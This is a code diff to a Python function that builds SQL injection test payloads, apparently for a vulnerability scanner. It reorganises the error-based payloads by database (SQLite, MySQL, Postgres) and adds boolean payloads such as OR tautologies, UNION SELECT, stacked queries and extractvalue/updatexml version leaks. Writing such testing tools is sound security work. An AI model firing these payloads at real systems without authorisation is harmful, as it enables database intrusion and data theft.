@@ -61,15 +61,34 @@ def get_sqli_payloads(detection: str = "all", db_type: str = "generic") -> List[
         ],
     }
 
-    # Error-based payloads
-    error_payloads = [
-        {"payload": "'", "type": "single_quote"},
-        {"payload": '"', "type": "double_quote"},
-        {"payload": "`", "type": "backtick"},
-        {"payload": "1'1", "type": "syntax_error"},
-        {"payload": "1 AND 1=CONVERT(int,'a')--", "type": "type_conversion"},
-        {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
-    ]
+    # Error-based payloads (database-specific)
+    error_payloads = {
+        "generic": [
+            {"payload": "'", "type": "single_quote"},
+            {"payload": '"', "type": "double_quote"},
+            {"payload": "`", "type": "backtick"},
+            {"payload": "1'1", "type": "syntax_error"},
+            {"payload": "1 AND 1=CONVERT(int,'a')--", "type": "type_conversion"},
+            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
+        ],
+        "sqlite": [
+            {"payload": "'", "type": "single_quote"},
+            {"payload": "' OR '", "type": "unclosed_string"},
+            {"payload": "1' AND '1", "type": "syntax_break"},
+            {"payload": "' UNION SELECT 1--", "type": "union_error"},
+            {"payload": "' ORDER BY 9999--", "type": "order_by_error"},
+            {"payload": "1; SELECT 1", "type": "stacked_query"},
+        ],
+        "mysql": [
+            {"payload": "'", "type": "single_quote"},
+            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
+            {"payload": "' AND updatexml(1,concat(0x7e,version()),1)--", "type": "updatexml"},
+        ],
+        "postgres": [
+            {"payload": "'", "type": "single_quote"},
+            {"payload": "' AND 1=CAST('a' AS INTEGER)--", "type": "cast_error"},
+        ],
+    }
 
     # Boolean-based payloads
     boolean_payloads = [
@@ -77,6 +96,9 @@ def get_sqli_payloads(detection: str = "all", db_type: str = "generic") -> List[
         {"true_payload": "' OR 1=1--", "false_payload": "' OR 1=2--"},
         {"true_payload": "1 OR 1=1", "false_payload": "1 AND 1=2"},
         {"true_payload": "' OR 'a'='a", "false_payload": "' OR 'a'='b"},
+        # SQLite-friendly (no comments needed)
+        {"true_payload": "1' OR '1'='1", "false_payload": "1' AND '1'='2"},
+        {"true_payload": "' OR 1=1 OR '1'='1", "false_payload": "' AND 1=2 AND '1'='1"},
     ]
 
     if detection in ["time", "all"]:
@@ -85,8 +107,9 @@ def get_sqli_payloads(detection: str = "all", db_type: str = "generic") -> List[
             payloads.append({"type": "time", "db": db_type, **p})
 
     if detection in ["error", "all"]:
-        for p in error_payloads:
-            payloads.append({"type": "error", **p})
+        db_error_payloads = error_payloads.get(db_type, error_payloads["generic"])
+        for p in db_error_payloads:
+            payloads.append({"type": "error", "db": db_type, **p})
 
     if detection in ["boolean", "all"]:
         for p in boolean_payloads:
